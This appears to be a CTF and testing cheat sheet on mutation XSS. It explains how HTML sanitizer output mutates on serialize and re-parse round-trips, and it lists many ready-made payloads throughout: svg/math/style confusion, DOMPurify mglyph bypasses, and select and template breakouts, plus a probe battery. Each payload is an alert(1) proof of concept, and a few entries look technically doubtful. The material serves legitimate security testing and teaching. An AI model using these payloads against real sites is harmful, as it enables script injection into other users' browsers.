# Mutation XSS (mXSS) — payloads that mutate into exploit during parse

mXSS exploits the gap between what a sanitizer THINKS it wrote and
what the browser's parser produces when it re-reads the string.
A sanitized DOM tree serialized to `innerHTML` and re-parsed is not
the same tree — the mutations during serialize→parse round-trips
are where these payloads live.

The canonical mutation surfaces:

```text
innerHTML read-back  →  the DOM→string→DOM round-trip
<svg>/<math> foreign content  →  HTML parser switches namespaces
<template>/<noscript>/<textarea> contents  →  raw-text switches
attribute value serialization  →  entity decode on re-parse
```

---

## 1. innerHTML round-trip — the core mechanism

```javascript
// sanitizer produces:
<div><img src="x" alt="&lt;script&gt;"></div>
// browser serializes to:
'<div><img src="x" alt="<script>"></div>'
// re-parsed:  the <script> inside the attribute quote is still
//             just text — safe? NO — watch what happens with tags
//             that switch parsing mode:
```

The mutations happen at namespace boundaries and rawtext elements.
A sanitized tree containing `<svg>` gets re-parsed in SVG
namespace; attributes and children mutate differently than HTML.

---

## 2. The classic mXSS shapes

### `<svg>`/`<math>` + `<style>`/`</style>` confusion

```html
<svg><style><a id="</style><img src=x onerror=alert(1)>">
   <!-- inside svg, <style> is raw-text; the a-id looks safe to
        the sanitizer, but on re-parse the </style> closes the
        style element and <img> lands as live markup -->
</svg>
```

```html
<svg><p><style><a id="</style><img src=x onerror=alert(1)>">
```

### `<noscript>` mutation (when scripting enabled vs disabled)

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
   <!-- scripting ON: noscript content is raw text → the title
        attr absorbs the payload; scripting OFF (some parsers/
        renderers): noscript parses as markup → img fires -->
</noscript>
```

### `<template>` contents

```html
<template><a id="</template><img src=x onerror=alert(1)>"></template>
   <!-- template contents are inert — but serialize→re-parse and
        the attr-quoted </template> closes the template early -->
```

### `<textarea>`/`<title>`/`<xmp>` rawtext

```html
<textarea><a title="</textarea><img src=x onerror=alert(1)>">
</textarea>
<xmp><a title="</xmp><img src=x onerror=alert(1)>"></xmp>
<iframe><a title="</iframe><img src=x onerror=alert(1)>"></iframe>
<noembed><a title="</noembed><img src=x onerror=alert(1)>"></noembed>
<noframes><a title="</noframes><img src=x onerror=alert(1)>"></noframes>
```

### attribute-value entity mutation

```html
<a href="&lt;script&gt;alert(1)">x</a>
   -- sanitizer sees text '<script>alert(1)' in href — safe.
   -- serialize→re-parse: href="<script>alert(1)" — the string
      becomes real markup? no — attribute values don't re-parse
      as markup. BUT inside svg/foreign boundaries they CAN when
      the namespace switch changes how the value serializes.
```

---

## 3. foreignObject — the HTML-island inside SVG

```html
<svg><foreignObject><a id="</foreignObject><img src=x onerror=alert(1)>"></foreignObject></svg>
<svg><foreignObject><p title="</p><img src=x onerror=alert(1)>"></p></foreignObject></svg>
```

`foreignObject` switches the parser BACK to HTML — the boundary is
where mutations concentrate. A sanitized tree containing foreign
content re-parses its descendants differently than the sanitizer
expected.

---

## 4. The DOMPurify-era bypasses (historical shapes that still land)

```html
<!-- the <mglyph>/<malignmark> class — inside <math>, these tags
     switch back to HTML parsing: -->
<math><mtext><table><mglyph><style><!--</style><img src=x
   onerror=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
<math><mtext><option><mglyph><style><img src=x onerror=alert(1)>
<math><mtext><option><mglyph><style><a id="</style><img src=x
   onerror=alert(1)>">
<math><mtext><option><mglyph><style><!--</style><img src=x
   onerror=alert(1)>">

<!-- the <annotation-xml> encoding switch -->
<math><annotation-xml encoding="text/html"><img src=x
   onerror=alert(1)></annotation-xml></math>
<svg><annotation-xml encoding="text/html"><img src=x
   onerror=alert(1)></annotation-xml></svg>

<!-- nested-closure forms -->
<svg><p><style><a id="</p><img src=x onerror=alert(1)>">
<form><math><mtext><table><mglyph><style><img src=x
   onerror=alert(1)>
```

Each shape exploits a specific serializer quirk; the payload lists
mutate as parsers evolve — the MECHANISM (namespace/rawtext
boundary confusion) is what persists.

---

## 5. Testing for mXSS — the round-trip probe

```javascript
// does the app serialize+reparse anywhere? grep for:
el.innerHTML = el.innerHTML;
el.innerHTML += something;
out = el.outerHTML;  el.outerHTML = out;
tpl.innerHTML = sanitize(tpl.innerHTML);

// probe: does this string mutate?
probe = '<svg><p><style><a id="TESTMARK">';
el.innerHTML = probe;
console.log(el.innerHTML);    // compare — attr content unchanged?
el2.innerHTML = el.innerHTML; // second pass — did a tag close early?
```

The signature: write a string whose re-parse produces MORE markup
than the string contains — e.g. a `</style>` inside an attribute
value that survives sanitation but closes the element on re-parse.

---

## 6. Sanitizer-specific mutation notes

| Sanitizer | Mutation class |
|---|---|
| DOMPurify | svg/math namespace confusion (historically the richest), `xlink:href` mutation, `form`+`mglyph` pairs |
| sanitize-html (node) | tag-name lowercasing, attribute re-ordering, entity re-encoding |
| Bleach (python) | allowed-list tag rewrite, `>`/`>>` in comments |
| HTML Purifier | strict — few mutations; entity edge cases |
| jsoup/java | `disableHtmlEscaping`, comment closure |
| OWASP Sanitizer | policy-driven — misconfigured policies mutate |
| builtin htmlspecialchars | quote-context-only — breakout lands |

The common thread: the sanitizer's output → browser's re-parse is
never identity. Any output that re-parses differently is a
candidate mutation point.

---

## 7. Non-obvious mutation triggers

```html
<!-- backtick in attribute — template-string confusion in
     template-injected contexts: -->
<div title="`+alert(1)+`">

<!-- null bytes — parser truncates -->
<div title="a%00" onerror="alert(1)">
<img src="x%00" onerror="alert(1)">

<!-- form feed / vertical tab as tag-name separators -->
<img src=x%0conerror=alert(1)>           -- \x0c inside the attr name
<img%0csrc=x%0conerror=alert(1)>
<svg%0conload=alert(1)>

<!-- namespace-adjacent: `<a>` inside <select> -->
<select><a id="</select><img src=x onerror=alert(1)>">
<select><option><a title="</option><img src=x onerror=alert(1)>">

<!-- `<input>` inside <select> — option context confusion: -->
<select><input autofocus onfocus=alert(1)>
<select><img src=x onerror=alert(1)>
<select><svg onload=alert(1)></select>
```

The `<select>` family mutates HARD — option-select parsing treats
descendants weirdly; any tag that "doesn't belong" inside a select
gets lifted or reparsed.

---

## 8. The reliable mXSS test battery

```html
<svg><p><style><a id="</style><img src=x onerror=alert(1)>">
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)">
<svg><foreignObject><a id="</foreignObject><img src=x onerror=alert(1)>"></foreignObject></svg>
<template><a id="</template><img src=x onerror=alert(1)>"></template>
<textarea><a title="</textarea><img src=x onerror=alert(1)>"></textarea>
<select><a id="</select><img src=x onerror=alert(1)>"></select>
<noscript><a title="</noscript><img src=x onerror=alert(1)>"></noscript>
<xmp><a title="</xmp><img src=x onerror=alert(1)>"></xmp>
<iframe><a title="</iframe><img src=x onerror=alert(1)>"></iframe>
```

Any of these surviving a sanitizer then re-parsing into markup is
a live mXSS. Run them through `xss_context.py` first, then eyeball
the serialized DOM.

---

## 9. The defense pattern that fails

Apps that do:

```javascript
el.innerHTML = DOMPurify.sanitize(user_html);
// later:
container.innerHTML = el.innerHTML;   // ← the round-trip
```

Or serialize a template for transport then re-parse it. The
round-trip IS the mXSS surface — the sanitizer's job ended at the
first parse; the second parse trusts text that was once a node.

---

## 10. Key insight for CTF

When a challenge mentions DOMPurify, sanitize, or "filtered HTML",
the intended bug is usually mXSS or a config gap — look for:

1. A `<svg>`/`<math>`-carrying allowed-tag list.
2. innerHTML round-trips in the app's JS.
3. An allowed attribute that contains markup-structured text.
4. Template/textarea/noscript allowed tags.

The payload families in §4 are the working set; the §8 battery is
the probe set.
